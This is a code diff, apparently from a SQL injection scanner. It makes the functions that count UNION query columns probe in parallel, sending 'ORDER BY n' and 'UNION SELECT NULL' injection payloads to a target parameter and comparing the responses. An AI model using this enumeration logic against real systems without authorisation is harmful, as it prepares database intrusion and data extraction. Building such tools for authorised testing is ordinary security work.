@@ -273,15 +273,27 @@ def _count_union_columns(url, param, sess, timeout, post_data, base_data,
     baseline = _send(url, param, "%s" % prefix, sess, timeout, post_data, base_data)
     if baseline is None:
         return 0
-    last_ok = 0
-    for n in range(1, 13):
+
+    from concurrent.futures import ThreadPoolExecutor
+
+    def _probe(n):
         payload = "%s ORDER BY %d-- " % (prefix, n)
         r = _send(url, param, payload, sess, timeout, post_data, base_data)
         if r is None:
-            continue
-        if _looks_like_error(r) or r.status_code != baseline.status_code:
+            return n, "err"
+        if _looks_like_error(r) or _looks_like_column_error(r) or \
+                r.status_code != baseline.status_code:
+            return n, "err"
+        return n, "ok"
+
+    with ThreadPoolExecutor(max_workers=6) as ex:
+        results = dict(ex.map(_probe, range(1, 13)))
+    last_ok = 0
+    for n in range(1, 13):
+        if results.get(n) == "ok":
+            last_ok = n
+        else:
             break
-        last_ok = n
     return last_ok
 
 
@@ -292,16 +304,26 @@ def _count_union_columns_null(url, param, sess, timeout, post_data, base_data,
     baseline = _send(url, param, "%s" % prefix, sess, timeout, post_data, base_data)
     if baseline is None:
         return 0
-    last_ok = 0
-    for n in range(1, 13):
+    from concurrent.futures import ThreadPoolExecutor
+
+    def _probe(n):
         payload = "%s UNION SELECT %s-- " % (prefix, ",".join(["NULL"] * n))
         r = _send(url, param, payload, sess, timeout, post_data, base_data)
         if r is None:
-            continue
-        if _looks_like_error(r) or _looks_like_column_error(r) \
-                or r.status_code != baseline.status_code:
+            return n, "err"
+        if _looks_like_error(r) or _looks_like_column_error(r) or \
+                r.status_code != baseline.status_code:
+            return n, "err"
+        return n, "ok"
+
+    with ThreadPoolExecutor(max_workers=6) as ex:
+        results = dict(ex.map(_probe, range(1, 13)))
+    last_ok = 0
+    for n in range(1, 13):
+        if results.get(n) == "ok":
+            last_ok = n
+        else:
             break
-        last_ok = n
     return last_ok
 
 
